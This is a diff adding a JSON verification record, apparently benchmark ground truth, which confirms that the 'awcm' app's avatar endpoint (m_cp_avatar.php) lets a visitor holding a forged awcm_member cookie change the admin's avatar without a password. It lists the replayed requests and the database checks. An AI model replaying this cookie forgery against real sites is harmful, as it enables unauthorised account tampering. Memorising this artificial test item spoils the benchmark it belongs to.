@@ -1,0 +1,55 @@
+{
+  "gt_id": "GT-001",
+  "app": "awcm",
+  "verified_at": "2026-09-06T04:57:15.780418+00:00",
+  "verdict": "vulnerable",
+  "summary": "visitor GET returned 200 with the avatar update form (form_present=True); plain visitor POST got 200 and did not modify DB rows (sessionless $member binds to id 'no'); with a forged awcm_member cookie the POST updated admin avatar 'DRHLGT_avatar_before_8670635114' -> 'DRHLGT_avatar_after_8670635114' without any password.",
+  "sql_statements": [
+    {
+      "kind": "execute",
+      "sql": "UPDATE awcm_members SET avatar='DRHLGT_avatar_before_8670635114' WHERE id=1"
+    },
+    {
+      "kind": "scalar",
+      "sql": "SELECT avatar FROM awcm_members WHERE id=1"
+    },
+    {
+      "kind": "scalar",
+      "sql": "SELECT avatar FROM awcm_members WHERE id=1"
+    }
+  ],
+  "steps": [
+    {
+      "kind": "instrument",
+      "table": "awcm_members",
+      "row": "id=1 (admin)",
+      "column": "avatar",
+      "token1": "DRHLGT_avatar_before_8670635114",
+      "token2": "DRHLGT_avatar_after_8670635114"
+    },
+    {
+      "kind": "replay",
+      "role": "visitor (no login)",
+      "request": "GET m_cp_avatar.php?KeepThis=true&TB_iframe=true&height=400&width=500",
+      "status_code": 200,
+      "form_present": true,
+      "body_saved": "GT-001_gt001_visitor_get.html"
+    },
+    {
+      "kind": "replay",
+      "role": "visitor (no login, no cookie)",
+      "request": "POST m_cp_avatar.php?do= avatar=DRHLGT_avatar_after_8670635114",
+      "status_code": 200,
+      "db_avatar_after": "DRHLGT_avatar_before_8670635114",
+      "changed_by_plain_visitor": false
+    },
+    {
+      "kind": "replay",
+      "role": "visitor + forged awcm_member cookie (no password)",
+      "request": "POST m_cp_avatar.php?do= avatar=DRHLGT_avatar_after_8670635114",
+      "status_code": 200,
+      "db_avatar_after": "DRHLGT_avatar_after_8670635114",
+      "changed_by_forged_cookie": true
+    }
+  ]
+}
